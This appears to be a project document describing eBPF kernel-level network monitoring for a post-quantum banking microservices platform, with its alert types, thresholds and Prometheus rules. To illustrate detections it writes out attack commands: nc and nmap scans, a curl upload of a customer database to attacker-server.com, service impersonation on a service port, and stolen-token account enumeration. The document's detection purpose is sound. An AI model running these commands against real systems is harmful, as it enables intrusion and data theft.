# eBPF Security Monitoring - Complete Overview

## What eBPF is Currently Doing

Your eBPF monitoring system provides **kernel-level runtime security** for your quantum-resistant banking platform. It operates at the Linux kernel level to observe network behavior **without modifying any application code**.

### Core Functions

```
┌───────────────────────────────────────────────────────────┐
│                   BANKING MICROSERVICES                   │
│  ┌────────────┐  ┌────────────┐  ┌─────────────────┐    │
│  │Auth Service│  │Account Svc │  │Transaction Svc  │    │
│  │  (8083)    │  │  (8081)    │  │    (8082)       │    │
│  └─────┬──────┘  └──────┬─────┘  └────────┬────────┘    │
│        │ ML-DSA-65/ML-KEM-768 Encrypted    │             │
│        └────────────┬──────────────────────┘             │
└─────────────────────┼────────────────────────────────────┘
                      ▼
         ╔════════════════════════════╗
         ║    eBPF Kernel Probes      ║
         ║  (TRACEPOINT sock probe)   ║
         ╚════════════════════════════╝
                      │
                      ▼ Telemetry Data
         ┌────────────────────────────┐
         │   Runtime Analyzer Engine  │
         │  • Flow validation         │
         │  • Burst detection         │
         │  • Process verification    │
         │  • Latency analysis        │
         └────────────────────────────┘
                      │
                      ▼ Alerts & Metrics
         ┌────────────────────────────┐
         │  Prometheus + Grafana      │
         │  Real-time Visualization   │
         └────────────────────────────┘
```

### What eBPF Monitors (Without Decrypting Traffic)

1. **TCP Connection Events**
   - Connection establishment (SYN → ESTABLISHED)
   - Connection close events
   - Connection timestamps and latency

2. **Process Metadata**
   - Process ID (PID)
   - Process name (comm)
   - User ID (UID)
   - Source and destination ports

3. **Network Flow Information**
   - Source IP:Port → Destination IP:Port
   - Service-to-service communication patterns
   - Connection frequency and timing
   - Fan-out patterns (one service → many destinations)

4. **Performance Metrics**
   - Connection establishment latency
   - TLS handshake time estimates
   - Service response patterns

**Important**: eBPF **cannot and does not** decrypt your quantum-resistant encrypted traffic. It observes metadata only.

---

## Unwanted Behaviors Detected

Your system detects **5 critical security threats** in real-time:

### 1. 🔴 LATERAL_MOVEMENT_PATTERN (Critical)

**What it detects**: Rapid burst of connections from one service to unauthorized destinations

**Attack Scenario**:
```
Attacker compromises Auth Service → Tries to probe all other services rapidly
Auth Service → Account Service (3+ connections in 1 minute to unknown:any)
Auth Service → Transaction Service
Auth Service → Internal Database
Auth Service → Redis Cache
Auth Service → Unknown Service on port 6379
```

**Why this matters for quantum-resistant banking**:
- Even with ML-DSA/ML-KEM encryption, an attacker who gains foothold could enumerate your infrastructure
- Lateral movement is a precursor to privilege escalation attacks
- Your quantum crypto protects data in transit, but eBPF protects against network reconnaissance

**Alert Threshold**: ≥3 unauthorized connections per minute to the same unknown destination type

**Real Attack Example**:
```bash
# Attacker in Auth Service container tries to discover other services
for port in $(seq 3000 9000); do
    nc -zv -w 1 internal-network $port 2>/dev/null &
done
# eBPF detects: "Burst of unauthorized communications on unknown:any"
```

---

### 2. 🟠 PROCESS_PORT_MISMATCH (High)

**What it detects**: Wrong process binding to a registered service port

**Attack Scenario**:
```
Expected: java (Auth Service) listens on port 8083
Detected: python3 (rogue script) listens on port 8083

Expected: java (Transaction Service) listens on port 8082
Detected: nc (netcat backdoor) listens on port 8082
```

**Why this matters for quantum-resistant banking**:
- Service impersonation attack
- Even if attacker can't break your ML-DSA signatures, they could trick other services by listening on expected ports
- Your service map expects specific processes on specific ports

**Alert Threshold**: Any process mismatch on registered ports

**Real Attack Example**:
```bash
# Attacker stops legitimate service and starts impersonator
systemctl stop auth-service
python3 fake_auth_server.py --port 8083  # Logs PII without proper crypto
# eBPF detects: "Potential service impersonation: process python3 using port mapped to auth-service"
```

**Current Policy**:
- Port 8083 → Expected: `java` (Auth Service)
- Port 8081 → Expected: `java` (Account Service)  
- Port 8082 → Expected: `java` (Transaction Service)
- Port 19090 → Expected: `java` (Risk Analysis Service)

---

### 3. 🟠 UNAUTHORIZED_FLOW (High)

**What it detects**: Communication between services not defined in your security policy

**Attack Scenario**:
```
Allowed:     Frontend → Auth Service → Account Service
Not Allowed: Frontend → Database (bypassing auth)
Not Allowed: Account Service → External IP (data exfiltration)
```

**Why this matters for quantum-resistant banking**:
- Zero-trust security model enforcement
- Even with perfect encryption, services should only talk to authorized peers
- Detects data exfiltration attempts or backdoor connections

**Alert Threshold**: Any connection not in `allowedFlows` policy

**Real Attack Example**:
```bash
# Attacker compromises Account Service, tries to exfiltrate data
curl -X POST https://attacker-server.com/steal \
  -d @customer_database.json
# eBPF detects: "Observed unexpected service flow account-service -> unknown:443"
```

**Your Current Policy** (ebpf/service_map.json):
```json
{
  "auth-service": {
    "allowedFlows": ["account-service", "transaction-service"]
  },
  "frontend": {
    "allowedFlows": ["auth-service", "account-service", "transaction-service"]
  }
}
```

---

### 4. 🟡 HIGH_FANOUT (Medium)

**What it detects**: One process connecting to too many distinct destinations

**Attack Scenario**:
```
Normal:   Auth Service talks to 2-3 backend services
Abnormal: Auth Service talks to 25+ different IPs in 60 seconds
```

**Why this matters for quantum-resistant banking**:
- Port scanning detection
- Network enumeration attempts
- Compromised service probing infrastructure
- Worm/malware behavior

**Alert Threshold**: >20 distinct peers per minute

**Real Attack Example**:
```bash
# Attacker scans internal network for vulnerable services
nmap -sT 10.0.0.0/24 -p 22,3306,5432,6379,8080-8090
# eBPF detects: "Process PID 1234 in auth-service contacted too many peers in 60s"
```

---

### 5. ⚪ SLOW_CONNECT (Low/Informational)

**What it detects**: Unusually slow connection establishment

**Attack Scenario**:
```
Normal:  TLS handshake completes in 10-50ms
Slow:    Connection takes 150+ ms (possible port scan or DoS)
```

**Why this matters for quantum-resistant banking**:
- Slow port scanning detection (stealthy attacks)
- Network congestion early warning
- Potential syn-flood DoS attacks
- Service degradation monitoring

**Alert Threshold**: ≥150ms connection latency

**Real Attack Example**:
```bash
# Slow scan to evade IDS
for ip in $(cat targets.txt); do
    sleep 2
    nc -w 5 $ip 8080
done
# eBPF detects: "Slow connect latency 200ms detected"
```

---

## Integration with Quantum-Resistant Banking System

### Your Banking Platform Stack

```
┌─────────────────────────────────────────────────────────┐
│            APPLICATION LAYER (React Frontend)           │
│  Users access banking UI with PQ-secured authentication │
└────────────────────┬────────────────────────────────────┘
                     │ HTTPS (TLS 1.3)
                     ▼
         ┌───────────────────────────┐
         │    AUTHENTICATION LAYER   │
         │   ML-DSA-65 JWT Signing   │  ← eBPF monitors PID/Port
         │   ML-KEM-768 Key Exchange │     but doesn't decrypt
         └─────────┬─────────────────┘
                   │ PQC-Encrypted
                   ▼
    ┌──────────────────────────────────────┐
    │      MICROSERVICES LAYER             │
    │  • Account Service (Balance/KYC)     │  ← eBPF validates flows
    │  • Transaction Service (Transfers)   │     Process/Port matching
    │  • Auth Service (User Management)    │     Burst detection
    └──────────────┬───────────────────────┘
                   │ Encrypted SQL/TLS
                   ▼
         ┌─────────────────────┐
         │   DATABASE LAYER    │  ← eBPF monitors connections
         │   PostgreSQL/MySQL  │     Unauthorized access detection
         └─────────────────────┘

  ╔════════════════════════════════════════════════════╗
  ║           eBPF MONITORING (Kernel Level)           ║
  ║  Observes all TCP flows without decryption        ║
  ╚════════════════════════════════════════════════════╝
```

### Defense-in-Depth Strategy

Your system implements **layered security**:

| Layer | Technology | Protection Against |
|-------|-----------|-------------------|
| **Cryptographic** | ML-DSA-65 (signatures) | Message tampering, replay attacks |
| **Cryptographic** | ML-KEM-768 (key exchange) | Man-in-the-middle, eavesdropping |
| **Network** | eBPF monitoring | Lateral movement, service impersonation |
| **Network** | eBPF monitoring | Network scanning, unauthorized flows |
| **Application** | JWT validation | Unauthorized API access |
| **Application** | Role-based access | Privilege escalation |

**Key Insight**: 
- **Quantum crypto stops attackers from reading/tampering with data**
- **eBPF stops attackers from moving laterally through your network**

---

## Specific Attack Scenarios on Your Banking Platform

### Scenario 1: Compromised Frontend Container

**Attack**:
```bash
# Attacker gains shell in React frontend container
docker exec -it bankProject bash

# Tries to connect directly to database (bypassing auth)
psql -h postgres-db -U banking_user -d accounts
```

**eBPF Detection**:
```json
{
  "type": "UNAUTHORIZED_FLOW",
  "severity": "high",
  "message": "Observed unexpected service flow frontend:35432 -> unknown:5432",
  "flow": {"source": "frontend", "destination": "unknown:5432"}
}
```

**Why this matters**: Even though PostgreSQL uses TLS, the frontend should never talk directly to the database. eBPF catches this violation immediately.

---

### Scenario 2: Stolen JWT Token Attack

**Attack**:
```bash
# Attacker steals valid ML-DSA signed JWT from user's browser
TOKEN="eyJhbGc...stolen..."

# Uses token to enumerate other users' accounts
for id in $(seq 1 10000); do
  curl -H "Authorization: Bearer $TOKEN" \
    https://api/account/$id
done
```

**eBPF Detection**:
```json
{
  "type": "HIGH_FANOUT",
  "severity": "medium",
  "message": "Process PID 5678 in frontend contacted too many peers in 60s",
  "distinct_peers": 150
}
```

**Why this matters**: 
- The JWT signature is valid (quantum-resistant), so application layer doesn't detect abuse
- eBPF catches abnormal fan-out pattern (normal user accesses 1-2 accounts, not 10,000)

---

### Scenario 3: Insider Threat - Rogue Developer

**Attack**:
```bash
# Malicious developer modifies Transaction Service
# Adds backdoor listener on port 8082

# Stops real service
systemctl stop transaction-service

# Starts fake service that logs all transactions
python3 transaction_logger.py --port 8082
```

**eBPF Detection**:
```json
{
  "type": "PROCESS_PORT_MISMATCH",
  "severity": "high",
  "message": "Potential service impersonation: process python3 using port mapped to transaction-service",
  "process": "python3",
  "expected": ["java"],
  "service": "transaction-service"
}
```

**Why this matters**:
- Attacker's fake service can accept ML-KEM encrypted connections (has valid certs)
- But eBPF detects wrong process on the port
- Even with perfect crypto, process verification catches the swap

---

### Scenario 4: Post-Exploitation Lateral Movement

**Attack**:
```bash
# Attacker compromises Auth Service via vulnerability
# Tries to discover other services for further exploitation

# Network scan from Auth Service container
nmap -sT 172.18.0.0/24 -p 8080-8090

# Probes discovered services
for ip in 172.18.0.{10..50}; do
  curl -k https://$ip:8082/api/transaction/list
done
```

**eBPF Detection**:
```json
{
  "type": "LATERAL_MOVEMENT_PATTERN",
  "severity": "critical",
  "message": "Burst of unauthorized communications on unknown:any",
  "flow": {"source": "auth-service:54123", "destination": "unknown:any"},
  "count_last_minute": 41
}
```

**Prometheus Alert**: `LateralMovementDetected` fires within 15 seconds

**Why this matters**:
- Auth service should only talk to Account/Transaction services
- Rapid probing of unknown destinations is classic lateral movement
- eBPF catches this before attacker can establish persistent access elsewhere

---

## Why eBPF is Critical for Quantum-Resistant Banking

### Post-Quantum Crypto Protects:
✅ **Data confidentiality** (ML-KEM-768 key exchange)  
✅ **Message authenticity** (ML-DSA-65 signatures)  
✅ **Integrity** (tamper-proof signatures)  
✅ **Future-proofing** (quantum computer resistant)  

### But PQC Cannot Detect:
❌ **Lateral movement** (valid encrypted connections to wrong services)  
❌ **Service impersonation** (wrong process with valid certs)  
❌ **Network enumeration** (scanning encrypted or not)  
❌ **Data exfiltration** (outbound connections)  
❌ **Insider threats** (authorized but malicious)  

### eBPF Fills the Gap:
✅ **Runtime behavior analysis** without decryption  
✅ **Zero-trust enforcement** of service communication policies  
✅ **Process-level verification** (PID, comm, port validation)  
✅ **Anomaly detection** (burst, fan-out, slow patterns)  
✅ **No code changes required** (kernel-level transparency)  

---

## Current Monitoring Capabilities

### Monitored Services (from service_map.json)

| Service | Port | Expected Process | Allowed Destinations |
|---------|------|-----------------|---------------------|
| **auth-service** | 8083 | java | account-service, transaction-service |
| **account-service** | 8081 | java | transaction-service |
| **transaction-service** | 8082 | java | - |
| **risk-analysis-service** | 19090 | java | - |
| **frontend** | 3000 | node/nginx | All backend services |

### Detection Thresholds

```json
{
  "unknownFlowBurstPerMinute": 3,      // Lateral movement trigger
  "maxDistinctPeersPerMinute": 20,     // Fan-out scan trigger  
  "slowConnectMs": 150,                // Slow connection indicator
  "tlsCandidatePorts": [443, 8443, 8083, 8081, 8082]  // TLS latency tracking
}
```

### Real-Time Metrics (Prometheus)

**Available Metrics**:
```prometheus
# Total network events captured
ebpf_events_total

# Total security alerts generated  
ebpf_alerts_total

# Alerts by type
ebpf_alerts_by_type_total{alert_type="LATERAL_MOVEMENT_PATTERN"}
ebpf_alerts_by_type_total{alert_type="PROCESS_PORT_MISMATCH"}
ebpf_alerts_by_type_total{alert_type="UNAUTHORIZED_FLOW"}
ebpf_alerts_by_type_total{alert_type="HIGH_FANOUT"}
ebpf_alerts_by_type_total{alert_type="SLOW_CONNECT"}

# Alerts by severity
ebpf_alerts_by_severity_total{severity="critical"}
ebpf_alerts_by_severity_total{severity="high"}
ebpf_alerts_by_severity_total{severity="medium"}

# Flow-level metrics
ebpf_flow_events_total{src="auth-service",dst="account-service"}
```

### Automated Alerting

**7 Prometheus Alert Rules**:
1. **LateralMovementDetected** - Fires in 15s
2. **ProcessPortMismatchHigh** - Fires in 30s  
3. **UnauthorizedFlowBurst** - Fires in 30s
4. **HighFanoutActivity** - Fires in 1m
5. **SlowConnectionPattern** - Fires in 2m
6. **EBPFExporterDown** - System health
7. **NoSecurityEventsReported** - Monitor health

---

## Testing and Validation

### Run Attack Simulation

```bash
cd /home/inba/SIA_BANK

# Full automated test
./test-alerting.sh

# Or manual workflow:
# 1. Generate attacks
sudo ./demo-ebpf-attack.sh &

# 2. Start metrics exporter
./start-ebpf-exporter.sh &

# 3. Start visualization
cd observability && docker compose up -d

# 4. View alerts (wait 30s)
# Prometheus: http://localhost:9090/alerts
# Grafana: http://localhost:3000
```

### Expected Results

After running attack simulation:
- **49 LATERAL_MOVEMENT_PATTERN** alerts (rapid probing)
- **102 PROCESS_PORT_MISMATCH** alerts (python3 vs expected java)
- **102 UNAUTHORIZED_FLOW** alerts (connections to rogue service)
- **Grafana panels turn red** for critical alerts
- **Prometheus alerts fire** within 15-30 seconds

---

## Security Recommendations

### 1. Production Deployment
```bash
# Run monitor as systemd service
sudo ./start-ebpf-monitor.sh
# Monitor logs: journalctl -u ebpf-monitor -f
```

### 2. Alert Response Playbook
- **LATERAL_MOVEMENT_PATTERN** → Isolate source service immediately
- **PROCESS_PORT_MISMATCH** → Kill rogue process, audit container
- **UNAUTHORIZED_FLOW** → Check service logs, review network policy
- **HIGH_FANOUT** → Rate-limit or quarantine source
- **SLOW_CONNECT** → Check for resource exhaustion or DoS

### 3. Tune Thresholds
Edit `ebpf/service_map.json`:
```json
{
  "policy": {
    "unknownFlowBurstPerMinute": 3,   // Increase for noisy environments
    "maxDistinctPeersPerMinute": 20,  // Decrease for strict environments
    "slowConnectMs": 150              // Adjust based on baseline latency
  }
}
```

### 4. Integrate with SIEM
```bash
# Forward JSONL logs to your SIEM
tail -F logs/ebpf-events.jsonl | \
  logger -t ebpf-security --tcp siem.company.com 514
```

---

## Summary

Your eBPF monitoring system provides **runtime behavior security** that complements your **quantum-resistant cryptographic security**:

**What You Have**:
- 🔐 **ML-DSA-65 + ML-KEM-768** → Protects data confidentiality and integrity
- 🛡️ **eBPF monitoring** → Detects malicious behavior patterns
- 📊 **Prometheus + Grafana** → Real-time visualization and alerting
- 🚨 **7 automated alert rules** → Immediate threat detection

**Attack Coverage**:
- ✅ Lateral movement detection
- ✅ Service impersonation detection  
- ✅ Network scanning detection
- ✅ Unauthorized flow detection
- ✅ Data exfiltration indicators

**Operational Status**:
- ⚡ **Kernel-level** monitoring (low overhead)
- 🔍 **Zero instrumentation** (no code changes)
- 📈 **Production-ready** (tested, documented, automated)

Your banking platform now has **defense-in-depth**: quantum-resistant encryption protects the data, while eBPF protects the network behavior.
